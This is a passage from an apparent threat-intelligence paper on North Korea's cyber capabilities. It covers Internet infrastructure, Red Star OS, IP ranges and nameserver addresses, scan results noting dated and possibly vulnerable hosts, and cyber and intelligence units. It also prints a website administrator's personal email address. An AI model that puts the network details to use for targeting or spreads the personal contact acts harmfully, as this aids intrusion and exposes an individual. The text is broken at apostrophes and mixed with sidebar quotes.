trustpolitik should be applied consistently from issue to issue based on verifiable actions, and
steps should not be taken for mere political expediency.
53 Shortly after Park
s inauguration,
North Korea denounced UN Security Council Resolution 2094, which is 
a resolution strengthening
and expanding the scope of United Nations sanctions against the Democratic People
s Republic of
Korea by targeting the illicit activities of diplomatic personnel, transfers of bulk cash, and the
country
s banking relationships, in response to that country
s third nuclear test on 12 February
[2013].
54 North Korea also responded strongly to joint U.S.-South Korea military exercises in
March 2013, as is noted later in this paper.55
North Korean cyber capabilities and limitations
North Korean infrastructure
North Korea
s cyber infrastructure is divided into two major parts: an outward-facing Internet
connection and a regime-controlled intranet. North Korea
s outward-facing Internet connection is
only available to select individuals and is closely monitored for any activity that is deemed anti-
regime. Individuals using the outward-facing Internet connection must be authorized. In 2013,
Jean H. Lee, the Associated Press bureau chief in Pyongyang, stated that foreigners visiting North
Korea are allowed Internet access with no firewalls.56 Common citizens are limited to using the
Kwangmyong (gwang me-young), a nationwide intranet with no access to the world outside North
Korea. 57 According to Lee, Kwangmyong allows citizens 
access to the state media, information
sources that are vetted by the government, and picked and pulled from the Internet and posted to
their intranet site.
58 As of May 2013, North Korea had only one 
Internet caf
59 A 2003 report
from the Office of the National Counterintelligence Executive stated that North Korea
Internet
 was 
the only place in North Korea for the public to access the Internet
 and that foreigners
were allowed to access the Internet from this caf
.60 Whether citizens are allowed to access the
Internet from this location is unknown.
Star Joint Venture Co. is responsible for providing North Korea
s Internet access. Star Joint Venture
Co. was established by the Post and Telecommunications Corporation in cooperation with Loxley
   http://www.ncnk.org/resources/briefing-papers/all-briefing-papers/an-overview-of-south-korea2019s-dprk-policy
   http://www.un.org/News/Press/docs/2013/sc10934.doc.htm
   http://www.ncnk.org/resources/briefing-papers/all-briefing-papers/an-overview-of-south-korea2019s-dprk-policy
   http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/
   http://www.computerworld.com/s/article/9177968/North_Korea_moves_quietly_onto_the_Internet?taxonomyId=18&pageNumber=2
   http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/
   http://www.washingtonpost.com/blogs/worldviews/wp/2013/01/29/north-koreans-shouldnt-count-on-using-the-new-google-maps/
   http://www.ncix.gov/publications/archives/docs/NORTH_KOREA_AND_FOREIGN_IT.pdf
Pacific in Thailand.61 In December 2009, Star Joint Venture became responsible for North Korea
Internet address allocation. Previously, Internet access was provided by a German satellite link via
Korea Computer Center Europe or via direct connections with China Netcom, which was later
merged into China Unicom. 62 By October 2010, North Korea had made its first known direct
connection to the Internet, hosting an outward-facing Korean Central News Agency website
accessible from the global Internet. 63 However, many of North Korea
s globally accessible
websites are hosted in other countries. In 2001, South Korean reports indicated that North Korea
had joined the International Telecommunications Satellite Organization (INTELSAT).64 As of April
2012, North Korea reportedly used the Intelsat connection, which appeared in border gateway
protocol (BGP) announcements.65 Some reports referred to the Intelsat connection as North
Korea
s backup Internet connection, in case the China Unicom connection fails.66 A March 2013
post on the blog rdns.im showed that North Korea no longer used the Intelsat connection. In the
blog post, the author noted his method for proving that The Pirate Bay was not hosted in North
Korea. While his analysis of The Pirate Bay
s hosting is irrelevant to our research, he did detail that
175.45.177.0/24 always routes through AS4837, and AS131279. AS131279 is Star-KP, North
Korea
s Star Joint Venture Company, and AS4837 is China Unicom. The author concluded that 
[traffic] is ONLY routed through China Unicom and NOT through Intelsat.
67 In February 2014,
North Korean and South Korean officials agreed to extend Internet access to Kaesong Industrial
Zone, a jointly operated industrial complex just north of the border. However, this would likely
require a major electrical and network infrastructure expansion.68
North Korea
s electrical grid cannot support a large technological infrastructure.69 Electrical
power is reported to be unreliable and sporadic, with many citizens only receiving a few hours of
electricity per day.70
   http://www.northkoreatech.org/2011/05/19/more-details-on-star-joint-venture/
   http://www.computerworld.com/s/article/9177968/North_Korea_moves_quietly_onto_the_Internet?taxonomyId=18&pageNumber=2
   http://www.northkoreatech.org/2010/10/09/the-new-face-of-kcna/
   http://webcache.googleusercontent.com/search?q=cache:http://english.chosun.com/site/data/html_dir/2001/05/29/2001052961197.html
   http://www.northkoreatech.org/2012/04/08/dprk-gets-second-link-to-internet/
   http://www.computerworld.com/s/article/9237652/North_Korea_39_s_Internet_returns_after_36_hour_outage
   https://rdns.im/the-pirate-bay-north-korean-hosting-no-its-fake-p2
   http://www.northkoreatech.org/2014/02/10/internet-coming-to-kaesong-industrial-zone/
   http://38north.org/2010/09/speak-loudly-and-carry-a-small-stick-the-north-korean-cyber-menace/
   http://www.usnews.com/news/blogs/rick-newman/2013/04/12/heres-how-lousy-life-is-in-north-korea
Figure 3 North and South Korean power grid
The photo above (Figure 3), from the International Space Station, shows North Korea
s sparse
power grid, in comparison with surrounding nations.71 We have highlighted North Korea in red.
Koryolink, the country
s only cellular phone network,72 is tightly controlled by the regime.73 Cell
phone data plans are not available to most users. Most cellular phones cannot access the
Internet and can only make domestic calls.74 According to a 2013 report, North Korea has a 3G
data network for cellular phones. Visiting reporter Jean H. Lee purportedly used this 3G network
to post to both Twitter and Instagram. However, citizens are not generally allowed to use the 3G
network.75
Email is also regulated by the regime. The first email provider in North Korea was Silibank. Silibank
has servers in Pyongyong and Shenyang and is a joint venture with China. The North Korean
Silibank homepage is silibank.net, and the Chinese homepage is silibank.com. In order to use the
email service, users had to initially register, provide personal information, and pay a registration
fee and monthly service fees.76 This registration information was current as of 2001. However, it
is unknown whether the same process still applies.
WHOIS records for silibank.net show that the site was registered anonymously via a Japanese
registrar. This information can be found in Appendix A at the end of this paper.
   http://www.citylab.com/work/2014/02/north-korea-night-looks-big-black-hole/8484/
   http://www.northkoreatech.org/2014/06/24/chinese-shops-offer-cheap-cellphones-to-north-koreans/
   http://www.defense.gov/pubs/ReporttoCongressonMilitaryandSecurityDevelopmentsInvolvingtheDPRK.pdf
   http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
   http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/
   http://edition.cnn.com/2001/TECH/internet/11/07/north.korea.email.idg/index.html
Korea Computer Center (KCC) is North Korea
s leading government research center for
information technology. KCC has eleven regional information centers and eight development and
production centers. Other countries with KCC branch offices include China, Syria, Germany, and
United Arab Emirates. KCC has a vested interest in Linux research and is responsible for the
development of North Korea
s national operating system, Red Star OS, which is discussed in more
detail below. KCC
s other projects have included a proprietary search engine, a document writer, a
game called Jang-Gi, the Kwangmyong intranet, a food study program, a Korean input method
editor, a pen-based English-Korean and Korean-English translator, Korean voice recognition
software, a video conferencing system, a distance education system, SilverStar Paduk software,
HMS Player77, and the Samjiyon tablet. 78 In addition to research and development, KCC also
monitors websites of foreign government and business entities and conducts technical
reconnaissance to blueprint the technical specifications and vulnerabilities in foreign systems and
technologies. KCC has also been involved in clandestine information and cyber operations, serving
as a command center.79
North Korea
s proprietary operating system is Red Star OS. The development of this Linux-based
operating system started in 2002. Red Star OS is only offered in the Korean language and
features proprietary software including Naenara (a Firefox-based browser), as well as a text
editor, email client, audio and video players, and games.80 Red Star OS
s keyboard layouts include
Korean, English, Russian, Chinese, and Japanese. Regime ideals extend to Red Star OS. The
readme file, which goes with the installation disc, reportedly includes a quote from Kim Jong-Il
regarding the importance of North Korea having its own Linux-based operating system that is
compatible with Korean traditions. While prior versions of Red Star were KDE-based, version 3.0
mimics Apple
s OS X.81 82 This could indicate the regime leader Kim Jong Un
s preference for the
OS X environment, as Kim reportedly uses an iMac.83 Citizens do not need permission to obtain
Red Star OS. However, the purchase of computers is heavily regulated.84 The OS
s design suggests
it was developed with means for the regime to monitor user activity.85
North Korea is known to use two IP ranges. 175.45.176.0/22 is North Korea
s own IP block.86
Additionally, North Korea
s Telecommunications Ministry is the registered user of China Unicom IP
range 210.52.109.0/24.87 The country
s only autonomous system (AS) number is AS131279, and
its only peer is AS4837, the AS for China Unicom.88
North Korea
s country code top-level domain (ccTLD) is .kp. In 2007, the .kp TLD was initially
delegated to and administered by the German-based KCC Europe.89 After KCC Europe failed to
   http://www.naenara.com.kp/en/kcc/
   http://www.northkoreatech.org/2012/09/28/samjiyon-android-tablet-debuts-at-pyongyang-trade-fair/
   http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf
   http://ashen-rus.livejournal.com/4300.html
   http://news.bbc.co.uk/2/hi/technology/8604912.stm
   http://www.arnnet.com.au/article/537360/north_korea_goes_osx-like_new_operating_system/
   http://www.businessinsider.com/brand-new-photo-confirms-that-kim-jong-un-is-a-mac-user-2013-3
   http://rt.com/news/north-korea-cyber-weapon/
   http://news.bbc.co.uk/2/hi/technology/8604912.stm
   http://binarycore.org/2012/05/29/investigating-north-koreas-netblock-part-2-dns/
   https://www.northkoreatech.org/2011/06/26/north-koreas-chinese-ip-addresses/
   http://binarycore.org/2012/05/29/investigating-north-koreas-netblock-part-2-dns/
   http://www.northkoreatech.org/2011/05/19/kp-domain-switch-came-after-kcc-europe-disappeared/
maintain the TLD, it was re-delegated to Star Joint Venture Company.90 The .kp TLD uses the
following nameservers and IP addresses:91
Nameserver             IP Address
ns1.kptc.kp            175.45.176.15
ns2.kptc.kp            175.45.176.16
ns3.kptc.kp            175.45.178.173
Various U.S., U.N, and other sanctions prohibit export of dual-use technologies to North Korea. In
light of this, North Korea has managed to develop both hardware and software and hosts an
annual National Exhibition of Invention and New Technologies to promote its products.92 However,
the regime has historically failed in its attempts at large-scale production of electronic
components. The country
s sparse electrical grid is one of the major obstacles hindering large-
scale manufacturing.93 Additionally, the famine in the early 1990
s negatively impacted existing
manufacturing facilities, and the regime simply does not have the capital to modernize those
factories.94 A member of the World International Property Organization (WIPO), North Korea joined
the WIPO Patent Cooperation Treaty that protects patents and trademarks worldwide, and
leverages intellectual property laws to ensure Westerners do not take credit for North Korean
inventions.95 The regime, in its efforts to isolate its citizens from Western influence, leverages
intellectual property laws to ensure Westerners do not take credit for North Korean inventions.96
This is ironic since foreign-made electronic components are sometimes smuggled into North
Korea for military use and for personal use by the regime
s upper echelon.
An analysis of developments in North Korean cyberspace since 2010
A comparison of a scan97 of North Korea
s IP ranges in November 2010, just one month after
North Korea made its first direct connection to the Internet, and a series of several scans we
conducted in May 2014, shows that North Korea has made significant headway in establishing its
Internet presence.
In the November 2010 scan, 175.45.176.0 - 175.45.176.16 showed a variety of devices including
D-link, Cisco, Linksys, HP, and Nokia devices, and a Juniper networks firewall. Operating systems
detected included FreeBSD 6.x, Linux 2.6.x, and Red Hat Enterprise Linux. 175.45.176.14 returned
Naenara
 as an html-title. Most hosts in the 175.45.176.xx and 175.45.177.xx ranges were
down. As of 2014, IP addresses 175.45.176.0 - 175.45.177.255 appear to be used for websites,
nameservers, databases, email, and voice over IP (VoIP). In November 2010, the 175.45.178.xx
range showed all hosts down,98 and the 175.45.179.xx range showed most hosts were down.99
   http://www.iana.org/reports/2011/kp-report-20110401.html
   http://www.iana.org/domains/root/db/kp.html
   http://yu.edu/admissions/events/yunmun/WIPO/Libenstein_WIPO_Topic1_HAHS.pdf
   http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH4.pdf
   http://sinonk.com/2013/10/11/a-primer-on-north-koreas-economy-an-interview-with-andrei-lankov/
   http://yu.edu/admissions/events/yunmun/WIPO/Libenstein_WIPO_Topic1_HAHS.pdf
   http://yu.edu/admissions/events/yunmun/WIPO/Libenstein_WIPO_Topic1_HAHS.pdf
   http://webcache.googleusercontent.com/search?q=cache:http://dprk.sipsik.net/175.45.178.txt
   http://webcache.googleusercontent.com/search?q=cache:http://dprk.sipsik.net/175.45.178.txt
   http://webcache.googleusercontent.com/search?q=cache:http://dprk.sipsik.net/175.45.179.txt
In 2014, several webservers and nameservers were found in the 175.45.178.xx range, and
several nameservers and mail servers were found in the 175.45.179.xx range. This comparison
demonstrates that there has been some growth in DPRK Internet infrastructure over the past four
years. However, it seemingly lags behind even most third world nations. The 2014 scans detected
dated technology that is potentially susceptible to multiple vulnerabilities and consistently
showed the same open ports and active devices on scanned hosts. It is not clear whether the
regime failed to notice and react to the scanning or whether the regime allows these open ports
and devices to be detected or spoofed to serve as a distraction or possible honeypot.
Domains, nameservers, and mail servers present during the May 2014 scan are listed in Appendix
B at the end of this report.
According to Alexa rankings, the three most visited websites in North Korea are kcna.kp, the
official website of the Korean Central News Agency (KCNA)100; rodong.rep.kp, another North
Korean news site101; and naenara.com.kp, North Korea
s official web portal.102 Naenara translates
my country
The kcna.kp site was registered using a Loxley.co.th email address and is administrated by Star
Joint Venture Company. The WHOIS Record can be found in Appendix A.
    http://dig.do/kcna.kp
    http://dig.do/rodong.rep.kp
    http://dig.do/naenara.com.kp
Figure 4 A screenshot from the kcna.kp homepage.103
Rodong.rep.kp was registered using the same loxley.co.th email address and is also administered
by Star Joint Venture Company. The WHOIS Record for this site can be found in Appendix A.
      http://kcna.kp/kcna.user.home.retrieveHomeInfoList.kcmsf
Figure 5 A screenshot from the rodong.rep.kp homepage.104
The WHOIS information for Naenara.com.kp was not available.
      http://rodong.rep.kp/ko/
Figure 6 A screenshot of the Naenara.com.kp website.105
In March 2013, there were reports that the Chrome browser was blocking Naenara.com.kp due to
malware.106
Figure 7 Screenshot of what visitors to Naenara.com.kp saw when using the Chrome browser.107
    http://naenara.com.kp/en/
    http://www.nkeconwatch.com/2013/03/25/chrome-blocking-naenara/
    http://www.nkeconwatch.com/2013/03/25/chrome-blocking-naenara/
Figure 8 Screenshot detailing why Chrome blocked the site108
It is difficult to say whether this incident is a case of North Korea serving malware or whether a
third party took advantage of an improperly secured website.
Several major North Korean websites are hosted outside of North Korea. The popular
Uriminzokkiri.com website, whose name translates to 
our nation,
 is hosted in China. The
administrative contact for the website is Kim Sejun, and the email address given as contact
information is hyk1979@hotmail.com. The WHOIS Record for this site can be found in Appendix A.
      http://www.nkeconwatch.com/2013/03/25/chrome-blocking-naenara/
Figure 9 A screenshot of the Uriminzokkiri website 109
The website for Kim Il Sung Open University, otherwise known as 
Our Nation School
 is also
hosted in China. The WHOIS record for this site can be found in Appendix A.
      http://www.uriminzokkiri.com/
Figure 10 A screenshot of ournation-school.com. 110
North Korean cyber war and intelligence structure
At the top of North Korea
s military structure is the National Defense Commission (NDC). The NDC
is also the highest branch of government and the regime
s supreme policymaking body. 111 Along
with the Central Committee of the Workers
 Party of Korea and the Cabinet, NDC is at the top of
      http://www.ournation-school.com/
      https://nkleadershipwatch.wordpress.com/dprk-security-apparatus/national-defense-commission/
North Korea
s political hierarchy.112 Article 106 of North Korea
s Constitution gives the NDC the
following powers:113
     
 The power to establish policies of the state in accordance with the military-first
        revolutionary line.
     
 The power to guide the armed forces and oversee defense building.
     
 The power to supervise and ensure the NDC and its chairman
s orders are executed and to
        establish necessary measures.
     
 The power to override any state decisions or directives that are in opposition to the NDC
        or its chairman
s decisions and directives.
     
 The power to create or remove central organs of the national defense sector.
     
 The power to create and bestow military titles above general-grade officer rank.
The NDC oversees several defense and intelligence bodies including the Ministry of State Security,
the Ministry of People
s Security, the Ministry of People
s Armed Forces, and the Korean People
Army. The Ministry of State Security (MSS), also known as the State Security Department, is North
Korea
s primary counterintelligence service. It is considered an autonomous agent of the regime
and reports directly to leader Kim Jong Un. The MSS
s duties include oversight of North Korean
prison camps, investigation of domestic espionage, repatriation of defectors, and overseas
counterespionage operations.114 The Ministry of People
s Security is also known as the Ministry of
Public Security (MPS). Focused on domestic order, it oversees North Korea
s national police force,
conducts criminal investigations and preliminary examinations, and oversees correctional
facilities, excluding prison camps.115 While the roles of the MSS and MPS focus more on
intelligence than on cyber operations, the MSS also reportedly has a communications monitoring
and computer hacking group.116
The Ministry of People
s Armed Forces (MPAF) administrates the Korean People
s Army (KPA) and
oversees the General Staff Department (GSD), which is responsible for              Unit 121 comprises both an
operational command and control of North Korea
s armed forces. The General         intelligence component and
Staff Department also oversees the Reconnaissance General Bureau (RGB), North      an attack component. One of
                                                                                   Unit 121
s command posts is
Korea
s agency for clandestine operations. The RGB has a role in both traditional
                                                                                   Chilbosan Hotel in Shenyang,
and cyber operations. In the past, the RGB has sent agents on overseas military    China. Unit 121 maintains
assistance missions to train insurgent groups.117 The RGB reportedly has a special technical reconnaissance
operations forces (SOF) element118 and oversees six bureaus that specialize in     teams responsible for
                                                                                   infiltration of computer
operations, reconnaissance, technology and cyber matters, overseas intelligence
                                                                                   networks, hacking to obtain
collection, inter-Korean talks, and service support.119 Two of these bureaus have  intelligence, and planting
been identified as the No. 91 Office and Unit 121. The No. 91 Office, an office    viruses on enemy networks.
responsible for hacking, operates out of the Mangkyungdae-district of
    http://whataboutnorthkorea.nl/2013/02/the-korean-workers-party/
    http://asiamatters.blogspot.co.uk/2009/10/north-korean-constitution-april-2009.html
    http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
    http://www.factba.se/handbook-page.php?id=1129700
    http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
    http://www.strategicstudiesinstitute.army.mil/pdffiles/pub771.pdf
    http://www.strategicstudiesinstitute.army.mil/pdffiles/pub771.pdf
    http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
Pyongyang.120 Unit 121 comprises both an intelligence component and an attack component. Unit
s headquarters is in the Moonshin-dong area of Pyongyang, near the Taedong River.121 It also
has components that conduct operations from within China. One of Unit 121
s command posts is
Chilbosan Hotel122 in Shenyang, the capital of Liaoning Province, which borders North Korea.123
Shenyang is a Chinese military district.124 According to Dr. Alexandre Mansourov, an expert on
North Korea and a visiting scholar at the U.S.-Korea Institute at Johns Hopkins University, "They
[Unit 121] are believed to have conducted hacking operations from inside China that falsify
classified data and disrupt U.S. and South Korean systems."125 Both Unit 121 and an entity known
as Lab 110 are reported to maintain technical reconnaissance teams responsible for infiltrating
computer networks, hacking to obtain intelligence, and planting viruses on enemy networks.126 127
Figure 11 A map pinpointing the location of the Chilbosan Hotel.128
    http://www.infosecisland.com/blogview/21577-Concerns-Mount-over-North-Korean-Cyber-Warfare-Capabilities.html
    http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
    http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
    http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
    http://www.defense.gov/pubs/2014_DoD_China_Report.pdf
    http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
    https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
    Clarke, R. A. (2012). Cyber war: The next threat to national security and what to do about it. New York, NY: Ecco.
    maps.google.com
Figure 12 A satellite view of the Chilbosan Hotel.129
Several entities are nested under the Workers
 Party. The Central Party
Committee oversees the Central Party Investigative Group, also known as Unit          The Unification Bureau falls
35. Unit 35 is reportedly responsible for technical education and training of
    130                                                                               under the Workers
 Party. Its
                                                                                      Operations Department is
cyber warriors. The Unification Bureau
s Operations Department is
                131                           132
                                                                                      responsible for cyber-
responsible for cyber-psychological warfare, organizational espionage, and            psychological warfare,
oversight of Unit 204. Unit 204
s responsibilities include planning and execution     organizational espionage, and
of cyber-psychological warfare operations and technological research. The             oversight of Unit 204. Unit 204
                                                                                      responsibilities include planning
Psychological Operations Department of the North Korea Defense Commission
                                                                                      and execution of cyber-
also engages in cyber-psychological warfare.133 The 225th Bureau, or Office 225,      psychological warfare operations
is responsible for training agents, infiltration operations in South Korea, and       and technological research. The
creation of underground political parties in order to incite disorder and revolution. Psychological Operations
It plays a more traditional intelligence and psychological operations role, rather    Department of the North Korea
                                                                                      Defense Commission also
than focusing on cyber operations.134 The United Front Department (UFD)               engages in cyber-psychological
conducts overt operations to create pro-North Korean groups in South Korea.           warfare.
Examples of this activity include the Korean Asia-Pacific Committee and the
Ethnic Reconciliation Council. The UFD also manages inter-Korean dialogue and North Korea
policy toward South Korea. Its operations are also more traditional rather than cyber-focused.135
    maps.google.com
    Clarke, R. A. (2012). Cyber war: The next threat to national security and what to do about it. New York, NY: Ecco.
    https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
    http://goodfriendsusa.blogspot.co.uk/2008/07/north-korea-today-no174.html
    https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
    http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
    http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
The Liaison Department of the Worker
s Party oversees a faction of ethnic North Koreans residing
in Japan who are critical to North Korea
s cyber and intelligence programs. This group, which was
established in 1955, is referred to by various names including the Chosen Soren, Chongryon, and
the General Association of Korean Residents in Japan.136 The Chongryon ascribe to juche and seek
to preserve North Korean culture while living in Japan. They operate North Korean style schools
and refuse to assimilate with Japanese culture.137 According to Mitsuhiro Suganuma, former
section head of the second intelligence department of the Japanese Public Security Intelligence
Agency (PSIA), 
Chongryon is virtually under the direct control of the Liaison Department of the
Workers
 Party of Korea, which has been in charge of North Korea
s covert operations and
underground activities against South Korea. Chongryon in Japan has been a strong support
organization aimed at bringing a revolution in South Korea, or a red unification by force.
 He also
stated 
North Korea will continue to make Chongryon serve as Pyongyang
s pawn in covert
operations against South Korea.
138 The Chongryon are vital to North Korea
s military budget,
raising funds via weapons trafficking, drug trafficking, and other black market activities.139 The
group also forms 
front companies
 abroad that benefit the regime by generating
                                                                                           
Chongryon is virtually
hard currency. One example is Unikotech, which was formed to sell KCC products             under the direct control of
abroad. 140 The Chongryon
s underground group known as the Gakushu-gumi, or                the Liaison Department of
the study group
, gathers intelligence for North Korea and helps the regime               the Workers
 Party of Korea,
                                                                                           which has been in charge of
procure advanced technologies.141 The Chongryon
s role in North Korean
                                                                                           North Korea
s covert
intelligence and resource acquisition is discussed below in more detail.                   operations and
                                                                                                                                    underground activities
The regime also has several government bodies under the Cabinet142 that oversee             against South Korea.
its infrastructure, intelligence, and technological development. These include the
Central Scientific and Technological Information Agency (CSTIA), the Ministry of Electronics
Industry, and the Ministry of Posts and Telecommunications. The CSTIA collects, analyzes, and
processes data regarding advanced science and technology then sends relevant information to
appropriate areas of the national economy.143 The amount of information contained in CSTIA's
technical database makes it North Korea's largest scientific facility. According to a CIA article,
review of CSTIA
s publications showed that China, Russia, and Japan are important sources of
technical data. CSTIA
s publications include newsletters and an 18-volume science and
technology reference series.144 The Ministry of Posts and Telecommunications is the body of
oversight for Star Joint Venture Co.145
    http://www.moj.go.jp/ENGLISH/PSIA/psia02-03.html
    http://www.moj.go.jp/ENGLISH/PSIA/psia02-03.html
    http://www.nknews.org/2014/02/chongryon-still-pyongyangs-pawn-in-covert-operations-former-intelligence-officer/
    http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf
    http://www.learningace.com/doc/2025666/863b663a9fb13b456304dd0a3bc43547/cyberwarfare
    http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf
    http://whataboutnorthkorea.nl/2013/02/the-korean-workers-party/
    https://www.cia.gov/library/center-for-the-study-of-intelligence/csi-publications/csi-studies/studies/vol48no1/article04.html
    https://www.cia.gov/library/center-for-the-study-of-intelligence/kent-csi/vol48no1/pdf/v48i1a04p.pdf
    https://www.northkoreatech.org/tag/ministry-of-posts-and-telecommunications/
North Korean cyber and intelligence organizational chart
Figure 13 North Korean cyber and intelligence organizational chart
North Korea
s cyber doctrine, strategies and goals
North Korea
s cyber warfare doctrine has not been clearly stated. However, based on cultural and
technical observations, we may deduce that North Korea
s cyber doctrine follows the tenets of
juche nationalism and the songun doctrine.
Although North Korea
s limited online presence makes a thorough analysis of their cyber warfare
capabilities a difficult task, it must be noted that what is known of those capabilities closely
mirrors their kinetic warfare tactics. Cyber warfare is simply the modern chapter in North Korea
long history of asymmetrical warfare. North Korea has used various unconventional tactics in the
past, such as guerilla warfare, strategic use of terrain, and psychological operations.146 The
regime also aspires to create viable nuclear weapons.147 Asymmetrical warfare is defined as 
conflict in which the resources of two belligerents differ in essence and in the struggle, interact
and attempt to exploit each other's characteristic weaknesses. Such struggles often involve
strategies and tactics of unconventional warfare, the 
weaker
 combatants attempting to use
strategy to offset deficiencies in quantity or quality
. 148
According to the aforementioned report to the House Armed Service Committee, 
Cyber warfare is
an important asymmetric dimension of conflict that North Korea will probably continue to
emphasize 
 in part because of its deniability and low relative costs.
149 North Korea
s poor
economic state150, further explains the regime
s reliance on these tactics. In 2014, the regime
reportedly spent 16% of its budget on defense.151 The North Korean military places a strong
emphasis on information warfare capabilities including political and psychological warfare152 and
cyber or hacker warfare.153
The report by Capt. Duk-Ki Kim, Ph.D. highlighted North Korea
s counter-asymmetric strategy and
ranked each based on intensity and frequency:
Figure 14 Threat matrix of North Korean asymmetric war capabilities.154
Cyber warfare operations
Just ten years ago, experts noted that North Korea was one of the 
least network-ready and most
isolated societies on the planet.
155 Today North Korea
s air-gapped networks and prioritization of
resources for military use provide both a secure and structured base of operations for cyber
operations and a secure means of communications.156 North Korea
s hermit infrastructure creates
    http://www.history.army.mil/brochures/kw-balance/balance.htm
    http://www.bbc.com/news/world-asia-pacific-11813699
    http://www.princeton.edu/~achaney/tmve/wiki100k/docs/Asymmetric_warfare.html
    http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
    http://www.foreignpolicy.com/articles/2013/04/29/7_things_north_korea_is_really_good_at
    http://blogs.wsj.com/korearealtime/2014/04/10/north-korea-details-budget-plans/
    https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
    http://www.giac.org/paper/gsec/1870/information-warfare/103284
    https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
    http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH4.pdf
    http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
a cyber-terrain that deters reconnaissance. Because North Korea has few Internet connections to
the outside world, anyone seeking intelligence on North Korea
s networks has to expend more
resources for cyber reconnaissance.157 A 2003 article by the U.S. Office of the National
Counterintelligence Executive assessed that 
Development of the nation, rather than
empowerment of the individual, appears to be driving DPRK efforts to develop domestic IT
infrastructure and industry.
158 In November 2013, Kim Jong Un referred to cyber warfare
capabilities as a 
magic weapon
 in conjunction with nuclear weapons and missiles.159
According to Kim Heung-kwang, a North Korean defector and former computer science professor,
the regime has the following motivations for expanding its cyber warfare capabilities:160
      
   Cyber capabilities are a cost-effective way to offset North Korea
s lack of kinetic military
          prowess.
      
   North Korea
s school systems place a strong emphasis on math, giving the nation
          confidence in its programmers, cryptographers, and security researchers.
      
   In the modern warfare landscape, cyber capabilities are potentially more utilitarian than
          heavy artillery or aircraft.
      
   Cyber warfare capabilities provide a platform for espionage, psychological operations,
          and other forms of non-kinetic warfare.
      
   Considering the separatist nature of North Korea
s infrastructure, cyber warfare provides
          a strategic advantage since outbound attacks are possible, but inbound attacks would
          have limited reach.
      
   Cyber warfare allows North Korea to leverage the Internet
s inherent flaws for offensive
          purposes while maintaining its defenses, primarily via air-gapping its most critical
          networks from the outside world.
North Korea
s attack and defense capabilities reportedly include the following cyber warfare and
electronic warfare components: offensive cyber operations (OCO); computer network operations
(CNO), which includes both computer network attack (CNA) and computer network exploitation
(CNE); distributed denial of service (DDoS);161 satellite monitoring; drones; GPS jamming
capabilities162; and deployment of electromagnetic pulse (EMP).163 North Korea
s OCO and CNO
capabilities became apparent as early as 2004, when North Korea reportedly gained access to 33
of 80 South Korean military wireless communication networks. In June 2006, an attack on the U.S.
State Department originating in the East Asia-Pacific region coincided with U.S.-North Korea
negotiations over the regime
s nuclear missile testing.164 A month later, a South Korean military
report implicated North Korea
s Unit 121 in hacking the South Korean and U.S. Defense
Departments. North Korea also tested a logic bomb in October 2007. A logic bomb is malicious
    http://www.huffingtonpost.com/2011/07/25/digital-revolution-north-korea_n_908368.html
    http://www.ncix.gov/publications/archives/docs/NORTH_KOREA_AND_FOREIGN_IT.pdf
    http://english.chosun.com/site/data/html_dir/2013/11/05/2013110501790.html
    http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
    http://www.defense.gov/pubs/ReporttoCongressonMilitaryandSecurityDevelopmentsInvolvingtheDPRK.pdf
   https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
    http://www.theregister.co.uk/2014/04/22/norks_drones_made_in_china/
    http://www.informationweek.com/state-department-releases-details-of-computer-system-attacks/d/d-id/1045112?
code programmed to execute based on a pre-defined triggering event. Following the logic bomb
test, the UN passed a resolution banning sales of certain computer hardware to North Korea.165
North Korea considers its cyber warfare capabilities an important asymmetric asset in the face of
its perceived enemies, the U.S. and South Korea. While North Korea does not have an immersive
digital culture, both the U.S. and South Korea are heavily dependent upon technological
infrastructure for social, economic, and political stability.166 For this reason, a cyber attack that
cripples or compromises the reliability of the U.S. or South Korea
s technological infrastructure
could have a far-reaching impact.
Gaming for profit and pwnage
North Korea has reportedly used computer games for both illegal capital gain and
                                                                                               North Korea has used
orchestrating cyber attacks. In 2011, South Korean police arrested five individuals,
                                                                                               computer games for both
including one Chinese national, for allegedly collaborating with North Korean hackers          illegal capital gain and
affiliated with the Korea Computer Center to steal money via online games.167                  orchestrating cyber attacks.
